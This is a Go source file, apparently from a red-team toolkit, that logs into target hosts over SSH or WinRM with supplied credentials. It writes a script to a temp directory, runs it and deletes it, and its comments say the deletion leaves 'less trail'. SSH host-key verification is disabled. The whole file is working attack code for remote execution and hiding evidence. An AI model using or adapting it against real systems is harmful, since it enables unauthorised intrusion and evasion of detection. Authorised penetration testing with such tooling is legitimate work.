package autopwn

import (
	"fmt"
	"os"
	"time"

	"github.com/masterzen/winrm"
	"github.com/opt/red-script/internal/files"
	"golang.org/x/crypto/ssh"
)

// Will attempt to execute a script located at scriptPath on the target host using
//	provided user and password through SSH.
func SSHAutopwn(host, user, password, scriptPath string) {

	// Set up SSH connection config
	sshConfig := &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		//HostKeyCallback: ssh.HostKeyCallback(func(hostname string, remote net.Addr, key ssh.PublicKey) error { return nil }),
		Timeout: 10 * time.Second,
	}

	// Attempt SSH connection/login
	conn, err := ssh.Dial("tcp", host+":22", sshConfig)
	if err != nil {
		os.Stderr.WriteString("ERROR(autopwn): Could not connect to SSH on " + host + " with provided user and password.\n")
		os.Stderr.WriteString(err.Error() + "\n")
		return
	}
	fmt.Println("autopwn: Successful SSH connection @" + host)
	defer conn.Close()

	// Read contents of script file and save to a string to be sent over through ssh
	fileString, err := files.ReadString(scriptPath)
	fmt.Println(fileString)

	// Create a new file in the tmp dir on the remote host containing the contents of the script
	if sshSessionExec(conn, "echo \""+fileString+"\"> /tmp/output.sh", host) != nil {
		return
	}
	// Execute the script on the remote host
	if sshSessionExec(conn, "sh /tmp/output.sh", host) != nil {
		return
	}
	// Delete the script on the remote host such that the same path can be used again (and less trail)
	if sshSessionExec(conn, "rm /tmp/output.sh", host) != nil {
		return
	}

}

func sshSessionExec(conn *ssh.Client, cmd string, host string) error {
	// Create a new session using conn
	session, err := conn.NewSession()
	if err != nil {
		os.Stderr.WriteString("ERROR(autopwn): Could not create an SSH session.\n")
		os.Stderr.WriteString(err.Error() + "\n")
		return err
	}

	// Execute specified command through the SSH session
	err = session.Run(cmd)
	if err != nil {
		os.Stderr.WriteString("ERROR(autopwn): Failed to execute command [ " + cmd + " ] on the remote host through SSH.\n")
		os.Stderr.WriteString(err.Error() + "\n")
		return err
	}
	fmt.Println("autopwn: Successful command execution through SSH @" + host)
	// Close the session (sessions can only be used to execute one instance of Run)
	session.Close()

	return nil
}

// Will attempt to execute a script located at scriptPath on the target host using
//	provided user and password through WinRM.
func WinRMAutopwn(host, user, password, scriptPath string) {

	port := 5985

	// Create an endpoint and setup the WinRM connection
	endpoint := winrm.NewEndpoint(host, port, false, true, nil, nil, nil, 30*time.Second)
	params := winrm.DefaultParameters
	params.TransportDecorator = func() winrm.Transporter { return &winrm.ClientNTLM{} }

	// Attempt to create WinRM client
	client, err := winrm.NewClientWithParameters(endpoint, user, password, params)
	if err != nil {
		os.Stderr.WriteString("ERROR(autopwn): Failed to create WinRM client.\n")
		os.Stderr.WriteString(err.Error() + "\n")
		return
	}

	fmt.Println("Successful WinRM connection @", host)

	// Read contents of script and save to a string to be used in a command later
	fileString, err := files.ReadString(scriptPath)
	//if scriptPath[len(scriptPath)-3:] == "bat"
	fmt.Println(fileString)

	// Put the contents of fileString into a file on the remote host
	if winrmExec(client, "echo \""+fileString+"\" > 'C:/Windows/Temp/output.bat'", host) != nil {
		return
	}
	// Execute the file created on the remote host
	if winrmExec(client, "'C:/Windows/Temp/output.bat'", host) != nil {
		return
	}
	// Delete the file created on the remote host
	if winrmExec(client, "rm 'C:/Windows/Temp/output.bat'", host) != nil {
		return
	}

}

func winrmExec(client *winrm.Client, cmd string, host string) error {
	ps := winrm.Powershell(cmd)
	_, err := client.Run(ps, os.Stdout, os.Stderr)
	if err != nil {
		os.Stderr.WriteString("ERROR(autopwn): Failed to execute command [ " + cmd + " ] on the remote host through WinRM.\n")
		os.Stderr.WriteString(err.Error() + "\n")
		return err
	}
	fmt.Println("autopwn: Successful command execution through WinRM @" + host)

	return nil
}
